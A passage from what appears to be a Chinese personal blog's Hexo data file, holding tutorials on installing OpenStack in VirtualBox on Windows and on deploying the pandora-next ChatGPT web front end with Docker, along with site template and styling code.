align=\"left\">默认就好</td>\n</tr>\n<tr>\n<td align=\"left\">RAM</td>\n<td align=\"left\">内存大小</td>\n</tr>\n<tr>\n<td align=\"left\">ROOT DISK</td>\n<td align=\"left\">根磁盘大小</td>\n</tr>\n<tr>\n<td align=\"left\">其他选项</td>\n<td align=\"left\">全部默认</td>\n</tr>\n</tbody></table>\n<p><img src=\"https://lxp731.github.io/img/openstack/create_flavors.png\" alt=\"flavor\"></p>\n<p>创建好之后，就会生成这样的一个flavor。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/succeed_flavors.png\" alt=\"flavor\"></p>\n<h3 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h3><p>和分发规格一样，我们同时可以自定义网络的模板,默认是会存在一个模板的，我们使用默认的模板，不再进行创建新的模板了，当然你可以按照个人的需求进行创建。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/network.png\" alt=\"network\"></p>\n<h3 id=\"发放虚拟机实例\"><a href=\"#发放虚拟机实例\" class=\"headerlink\" title=\"发放虚拟机实例\"></a>发放虚拟机实例</h3><p>我们到project的instances目录，这里还没有虚拟机实例，我们来创建一个。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/instances.png\" alt=\"network\"></p>\n<ol>\n<li><p>点击右上角的<code>launch instances</code>。</p>\n</li>\n<li><p>设置details，名字自己起，描述选填，其他默认就好，然后next。</p>\n</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/details.png\" alt=\"network\"></p>\n<ol start=\"3\">\n<li>设置source，为了节省空间我选择不再创建新的卷，然后将下面的模板直接应用，点旁边的上箭头应用，然后next。</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/source.png\" alt=\"network\"></p>\n<ol start=\"4\">\n<li>设置flavor，这里有我们刚刚创建的flavor模板，我们直接点旁边的上箭头。</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/flavor.png\" alt=\"network\"></p>\n<ol start=\"5\">\n<li><p>最后设置network，默认已经选好了。那么，计算资源，存储资源，网络资源我们都配置好了，就可以直接发布虚拟机了，点击右下角的按钮分发实例。</p>\n</li>\n<li><p>稍作等待，就会出现下面这个页面，等实例处于active时，就大功告成了。</p>\n</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/finish.png\" alt=\"network\"></p>"},{"title":"OpenStack在windows上安装教程","date":"2023-03-19T06:23:00.000Z","_content":"\n### 项目准备\n\n1. 安装VirtualBOX\n\n> https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe\n\n2. 下载OpenStack的项目资源\n\nOpenStack https://www.aliyundrive.com/s/3uZc1uBwq24 提取码: m8zf\n\n如果是下载的这个网站提供的OpenStack项目资源，那么可以进行查看一下以下几个文件都应该已经存在了。\n\n<!-- more -->\n\n![](https://lxp731.github.io/img/openstack/1.png)\n\n### 开始安装\n\n1. 接下来修改几个文件的配置文件,全部换成自己电脑中VirtualBOX的绝对安装路径\n\n![](https://lxp731.github.io/img/openstack/modify_config.png)\n\n2. 完成后双击运行create_hostnet.bat脚本，出现succeeded字样安装完成。\n\n![](https://lxp731.github.io/img/openstack/succeeded.png)\n\n3. 打开VirtualBOX---管理---主机网络管理器，发现会多出来以下两个Adapter：\n\n![](https://lxp731.github.io/img/openstack/Adapter.png)\n\n4. 在virtualbox中导入.ova文件的虚拟机\n\nvirtualbox---管理---导入虚拟电脑，分别导入第一张图中的computer1.ova文件和controller.ova文件\n\n5. 运行虚拟电脑\n\n鼠标右击之后选择无页面启动就OK。\n\n### 体验OpenStack\n\n接着在浏览器输入```127.0.0.1:8888/horizon```回车\n\n默认OpenStack存在两个用户：\n\n\n|||\n|:--:|:--:|\n|user|password|\n|admin|admin_user_secret|\n|myuser|myuser_user_pass|","source":"_posts/openstack-install.md","raw":"---\ntitle: OpenStack在windows上安装教程\ndate:       2023-03-19 14:23\ncategories: \n  - 探索\ntags: \n  - Openstack\n---\n\n### 项目准备\n\n1. 安装VirtualBOX\n\n> https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe\n\n2. 下载OpenStack的项目资源\n\nOpenStack https://www.aliyundrive.com/s/3uZc1uBwq24 提取码: m8zf\n\n如果是下载的这个网站提供的OpenStack项目资源，那么可以进行查看一下以下几个文件都应该已经存在了。\n\n<!-- more -->\n\n![](https://lxp731.github.io/img/openstack/1.png)\n\n### 开始安装\n\n1. 接下来修改几个文件的配置文件,全部换成自己电脑中VirtualBOX的绝对安装路径\n\n![](https://lxp731.github.io/img/openstack/modify_config.png)\n\n2. 完成后双击运行create_hostnet.bat脚本，出现succeeded字样安装完成。\n\n![](https://lxp731.github.io/img/openstack/succeeded.png)\n\n3. 打开VirtualBOX---管理---主机网络管理器，发现会多出来以下两个Adapter：\n\n![](https://lxp731.github.io/img/openstack/Adapter.png)\n\n4. 在virtualbox中导入.ova文件的虚拟机\n\nvirtualbox---管理---导入虚拟电脑，分别导入第一张图中的computer1.ova文件和controller.ova文件\n\n5. 运行虚拟电脑\n\n鼠标右击之后选择无页面启动就OK。\n\n### 体验OpenStack\n\n接着在浏览器输入```127.0.0.1:8888/horizon```回车\n\n默认OpenStack存在两个用户：\n\n\n|||\n|:--:|:--:|\n|user|password|\n|admin|admin_user_secret|\n|myuser|myuser_user_pass|","slug":"openstack-install","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5gb007o7zj3cud9526a","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"项目准备\"><a href=\"#项目准备\" class=\"headerlink\" title=\"项目准备\"></a>项目准备</h3><ol>\n<li>安装VirtualBOX</li>\n</ol>\n<blockquote>\n<p><a href=\"https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe\">https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe</a></p>\n</blockquote>\n<ol start=\"2\">\n<li>下载OpenStack的项目资源</li>\n</ol>\n<p>OpenStack <a href=\"https://www.aliyundrive.com/s/3uZc1uBwq24\">https://www.aliyundrive.com/s/3uZc1uBwq24</a> 提取码: m8zf</p>\n<p>如果是下载的这个网站提供的OpenStack项目资源，那么可以进行查看一下以下几个文件都应该已经存在了。</p>\n<span id=\"more\"></span>\n\n<p><img src=\"https://lxp731.github.io/img/openstack/1.png\"></p>\n<h3 id=\"开始安装\"><a href=\"#开始安装\" class=\"headerlink\" title=\"开始安装\"></a>开始安装</h3><ol>\n<li>接下来修改几个文件的配置文件,全部换成自己电脑中VirtualBOX的绝对安装路径</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/modify_config.png\"></p>\n<ol start=\"2\">\n<li>完成后双击运行create_hostnet.bat脚本，出现succeeded字样安装完成。</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/succeeded.png\"></p>\n<ol start=\"3\">\n<li>打开VirtualBOX—管理—主机网络管理器，发现会多出来以下两个Adapter：</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/Adapter.png\"></p>\n<ol start=\"4\">\n<li>在virtualbox中导入.ova文件的虚拟机</li>\n</ol>\n<p>virtualbox—管理—导入虚拟电脑，分别导入第一张图中的computer1.ova文件和controller.ova文件</p>\n<ol start=\"5\">\n<li>运行虚拟电脑</li>\n</ol>\n<p>鼠标右击之后选择无页面启动就OK。</p>\n<h3 id=\"体验OpenStack\"><a href=\"#体验OpenStack\" class=\"headerlink\" title=\"体验OpenStack\"></a>体验OpenStack</h3><p>接着在浏览器输入<code>127.0.0.1:8888/horizon</code>回车</p>\n<p>默认OpenStack存在两个用户：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">user</td>\n<td align=\"center\">password</td>\n</tr>\n<tr>\n<td align=\"center\">admin</td>\n<td align=\"center\">admin_user_secret</td>\n</tr>\n<tr>\n<td align=\"center\">myuser</td>\n<td align=\"center\">myuser_user_pass</td>\n</tr>\n</tbody></table>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"项目准备\"><a href=\"#项目准备\" class=\"headerlink\" title=\"项目准备\"></a>项目准备</h3><ol>\n<li>安装VirtualBOX</li>\n</ol>\n<blockquote>\n<p><a href=\"https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe\">https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe</a></p>\n</blockquote>\n<ol start=\"2\">\n<li>下载OpenStack的项目资源</li>\n</ol>\n<p>OpenStack <a href=\"https://www.aliyundrive.com/s/3uZc1uBwq24\">https://www.aliyundrive.com/s/3uZc1uBwq24</a> 提取码: m8zf</p>\n<p>如果是下载的这个网站提供的OpenStack项目资源，那么可以进行查看一下以下几个文件都应该已经存在了。</p>","more":"<p><img src=\"https://lxp731.github.io/img/openstack/1.png\"></p>\n<h3 id=\"开始安装\"><a href=\"#开始安装\" class=\"headerlink\" title=\"开始安装\"></a>开始安装</h3><ol>\n<li>接下来修改几个文件的配置文件,全部换成自己电脑中VirtualBOX的绝对安装路径</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/modify_config.png\"></p>\n<ol start=\"2\">\n<li>完成后双击运行create_hostnet.bat脚本，出现succeeded字样安装完成。</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/succeeded.png\"></p>\n<ol start=\"3\">\n<li>打开VirtualBOX—管理—主机网络管理器，发现会多出来以下两个Adapter：</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/Adapter.png\"></p>\n<ol start=\"4\">\n<li>在virtualbox中导入.ova文件的虚拟机</li>\n</ol>\n<p>virtualbox—管理—导入虚拟电脑，分别导入第一张图中的computer1.ova文件和controller.ova文件</p>\n<ol start=\"5\">\n<li>运行虚拟电脑</li>\n</ol>\n<p>鼠标右击之后选择无页面启动就OK。</p>\n<h3 id=\"体验OpenStack\"><a href=\"#体验OpenStack\" class=\"headerlink\" title=\"体验OpenStack\"></a>体验OpenStack</h3><p>接着在浏览器输入<code>127.0.0.1:8888/horizon</code>回车</p>\n<p>默认OpenStack存在两个用户：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">user</td>\n<td align=\"center\">password</td>\n</tr>\n<tr>\n<td align=\"center\">admin</td>\n<td align=\"center\">admin_user_secret</td>\n</tr>\n<tr>\n<td align=\"center\">myuser</td>\n<td align=\"center\">myuser_user_pass</td>\n</tr>\n</tbody></table>"},{"title":"在本地搭建自己的chatGPT","date":"2023-12-24T04:04:25.000Z","_content":"\n### 背景 \n\n由于 [**pandora**](https://github.com/cloud804d/mirrors-pengzhile-pandora) 项目被攻击加之开发者的 github 账号频繁被封，作者重新开了新账号进行项目的开发，于是有了功能更强大的 [**pandora-next**](https://github.com/pandora-next/deploy?tab=readme-ov-file)\n\n### 准备工作\n\n有一个 github 的账号，最好是注册了一年以上的。\n\n<!-- more -->\n\n* [**注册github账号**](https://github.com/)\n\n有 docker 环境，最好有 docker-compose 环境。   \n* [**安装docker环境教程**](https://nustarain.gitee.io/2023/10/30/DockerInit/?highlight=docker)\n* [**安装docker-compose环境教程**](https://nustarain.gitee.io/2023/11/03/install-docker-compose/?highlight=docker)\n\n接下来就是教程时间。\n\n### 配置步骤\n\n1. 首先克隆项目的仓库，墙外用第一个链接，墙内用第二个链接。\n\n```bash\ngit clone https://github.com/pandora-next/deploy.git\ngit clone https://gitclone.com/github.com/pandora-next/deploy.git\n```\n\n2. 执行以下操作。\n\n```bash\nmv deploy/ pandora_next\ncd pandora_next/\nrm -rf best.php README.md \n```\n\n3. 获取 license_id \n\n在这里获取：[https://dash.pandoranext.com](https://dash.pandoranext.com)   \n然后会要求你登录 github 的账号，正常登录，然后会出现以下页面。\n\n![pandora](./pandora-next/1.png)\n\n* github 账号注册时间主要是影响每天的对话数量。\n* 复制下面的 license_id，待会儿会用到。\n* 如果是在 VPS 上搭建的话，可以执行下面的随便一条命令来下载 license.jwt 文件，下载后不需要更改，放在 pandora_next 目录下就可以。\n\n4. 修改 config.json 文件\n\n```bash\ncd data/ && vim config.json\n```\n\n* \"bind\": \"0.0.0.0:8181\" 默认使用的8181端口，可以在这里进行修改。\n* 修改 license_id 字段，将之前复制的 license_id 复制到这里。\n* site_password 字段是进入 Web 时要填的密码。\n* setup_password 字段是管理配置文件的密码，使用方法是在浏览器搜索框输入`127.0.0.1:8181/setup`\n\n其他字段的含义可以查看[**官方的说明文档**](https://docs.pandoranext.com/zh-CN/configuration/config)\n\n5. 启动容器\n\n```bash\ncd .. && docker-compose up -d\n```\n\n6. 大功告成，浏览器访问即可，下期介绍 [**pandora-next 关于 token.json 的进阶操作**]()。","source":"_posts/pandora-next.md","raw":"---\ntitle: 在本地搭建自己的chatGPT\ndate: 2023-12-24 12:04:25\ncategories: 小玩意儿\ntags:\n  - AI\n---\n\n### 背景 \n\n由于 [**pandora**](https://github.com/cloud804d/mirrors-pengzhile-pandora) 项目被攻击加之开发者的 github 账号频繁被封，作者重新开了新账号进行项目的开发，于是有了功能更强大的 [**pandora-next**](https://github.com/pandora-next/deploy?tab=readme-ov-file)\n\n### 准备工作\n\n有一个 github 的账号，最好是注册了一年以上的。\n\n<!-- more -->\n\n* [**注册github账号**](https://github.com/)\n\n有 docker 环境，最好有 docker-compose 环境。   \n* [**安装docker环境教程**](https://nustarain.gitee.io/2023/10/30/DockerInit/?highlight=docker)\n* [**安装docker-compose环境教程**](https://nustarain.gitee.io/2023/11/03/install-docker-compose/?highlight=docker)\n\n接下来就是教程时间。\n\n### 配置步骤\n\n1. 首先克隆项目的仓库，墙外用第一个链接，墙内用第二个链接。\n\n```bash\ngit clone https://github.com/pandora-next/deploy.git\ngit clone https://gitclone.com/github.com/pandora-next/deploy.git\n```\n\n2. 执行以下操作。\n\n```bash\nmv deploy/ pandora_next\ncd pandora_next/\nrm -rf best.php README.md \n```\n\n3. 获取 license_id \n\n在这里获取：[https://dash.pandoranext.com](https://dash.pandoranext.com)   \n然后会要求你登录 github 的账号，正常登录，然后会出现以下页面。\n\n![pandora](./pandora-next/1.png)\n\n* github 账号注册时间主要是影响每天的对话数量。\n* 复制下面的 license_id，待会儿会用到。\n* 如果是在 VPS 上搭建的话，可以执行下面的随便一条命令来下载 license.jwt 文件，下载后不需要更改，放在 pandora_next 目录下就可以。\n\n4. 修改 config.json 文件\n\n```bash\ncd data/ && vim config.json\n```\n\n* \"bind\": \"0.0.0.0:8181\" 默认使用的8181端口，可以在这里进行修改。\n* 修改 license_id 字段，将之前复制的 license_id 复制到这里。\n* site_password 字段是进入 Web 时要填的密码。\n* setup_password 字段是管理配置文件的密码，使用方法是在浏览器搜索框输入`127.0.0.1:8181/setup`\n\n其他字段的含义可以查看[**官方的说明文档**](https://docs.pandoranext.com/zh-CN/configuration/config)\n\n5. 启动容器\n\n```bash\ncd .. && docker-compose up -d\n```\n\n6. 大功告成，浏览器访问即可，下期介绍 [**pandora-next 关于 token.json 的进阶操作**]()。","slug":"pandora-next","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5gd007s7zj361qrh7ls","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>由于 <a href=\"https://github.com/cloud804d/mirrors-pengzhile-pandora\"><strong>pandora</strong></a> 项目被攻击加之开发者的 github 账号频繁被封，作者重新开了新账号进行项目的开发，于是有了功能更强大的 <a href=\"https://github.com/pandora-next/deploy?tab=readme-ov-file\"><strong>pandora-next</strong></a></p>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>有一个 github 的账号，最好是注册了一年以上的。</p>\n<span id=\"more\"></span>\n\n<ul>\n<li><a href=\"https://github.com/\"><strong>注册github账号</strong></a></li>\n</ul>\n<p>有 docker 环境，最好有 docker-compose 环境。   </p>\n<ul>\n<li><a href=\"https://nustarain.gitee.io/2023/10/30/DockerInit/?highlight=docker\"><strong>安装docker环境教程</strong></a></li>\n<li><a href=\"https://nustarain.gitee.io/2023/11/03/install-docker-compose/?highlight=docker\"><strong>安装docker-compose环境教程</strong></a></li>\n</ul>\n<p>接下来就是教程时间。</p>\n<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>首先克隆项目的仓库，墙外用第一个链接，墙内用第二个链接。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pandora-next/deploy.git</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://gitclone.com/github.com/pandora-next/deploy.git</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>执行以下操作。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> deploy/ pandora_next</span><br><span class=\"line\"><span class=\"built_in\">cd</span> pandora_next/</span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf best.php README.md </span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>获取 license_id</li>\n</ol>\n<p>在这里获取：<a href=\"https://dash.pandoranext.com/\">https://dash.pandoranext.com</a><br>然后会要求你登录 github 的账号，正常登录，然后会出现以下页面。</p>\n<p><img src=\"/2023/12/24/pandora-next/1.png\" alt=\"pandora\"></p>\n<ul>\n<li>github 账号注册时间主要是影响每天的对话数量。</li>\n<li>复制下面的 license_id，待会儿会用到。</li>\n<li>如果是在 VPS 上搭建的话，可以执行下面的随便一条命令来下载 license.jwt 文件，下载后不需要更改，放在 pandora_next 目录下就可以。</li>\n</ul>\n<ol start=\"4\">\n<li>修改 config.json 文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> data/ &amp;&amp; vim config.json</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>“bind”: “0.0.0.0:8181” 默认使用的8181端口，可以在这里进行修改。</li>\n<li>修改 license_id 字段，将之前复制的 license_id 复制到这里。</li>\n<li>site_password 字段是进入 Web 时要填的密码。</li>\n<li>setup_password 字段是管理配置文件的密码，使用方法是在浏览器搜索框输入<code>127.0.0.1:8181/setup</code></li>\n</ul>\n<p>其他字段的含义可以查看<a href=\"https://docs.pandoranext.com/zh-CN/configuration/config\"><strong>官方的说明文档</strong></a></p>\n<ol start=\"5\">\n<li>启动容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> .. &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>大功告成，浏览器访问即可，下期介绍 <a href><strong>pandora-next 关于 token.json 的进阶操作</strong></a>。</li>\n</ol>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>由于 <a href=\"https://github.com/cloud804d/mirrors-pengzhile-pandora\"><strong>pandora</strong></a> 项目被攻击加之开发者的 github 账号频繁被封，作者重新开了新账号进行项目的开发，于是有了功能更强大的 <a href=\"https://github.com/pandora-next/deploy?tab=readme-ov-file\"><strong>pandora-next</strong></a></p>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>有一个 github 的账号，最好是注册了一年以上的。</p>","more":"<ul>\n<li><a href=\"https://github.com/\"><strong>注册github账号</strong></a></li>\n</ul>\n<p>有 docker 环境，最好有 docker-compose 环境。   </p>\n<ul>\n<li><a href=\"https://nustarain.gitee.io/2023/10/30/DockerInit/?highlight=docker\"><strong>安装docker环境教程</strong></a></li>\n<li><a href=\"https://nustarain.gitee.io/2023/11/03/install-docker-compose/?highlight=docker\"><strong>安装docker-compose环境教程</strong></a></li>\n</ul>\n<p>接下来就是教程时间。</p>\n<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>首先克隆项目的仓库，墙外用第一个链接，墙内用第二个链接。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pandora-next/deploy.git</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://gitclone.com/github.com/pandora-next/deploy.git</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>执行以下操作。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> deploy/ pandora_next</span><br><span class=\"line\"><span class=\"built_in\">cd</span> pandora_next/</span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf best.php README.md </span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>获取 license_id</li>\n</ol>\n<p>在这里获取：<a href=\"https://dash.pandoranext.com/\">https://dash.pandoranext.com</a><br>然后会要求你登录 github 的账号，正常登录，然后会出现以下页面。</p>\n<p><img src=\"/2023/12/24/pandora-next/1.png\" alt=\"pandora\"></p>\n<ul>\n<li>github 账号注册时间主要是影响每天的对话数量。</li>\n<li>复制下面的 license_id，待会儿会用到。</li>\n<li>如果是在 VPS 上搭建的话，可以执行下面的随便一条命令来下载 license.jwt 文件，下载后不需要更改，放在 pandora_next 目录下就可以。</li>\n</ul>\n<ol start=\"4\">\n<li>修改 config.json 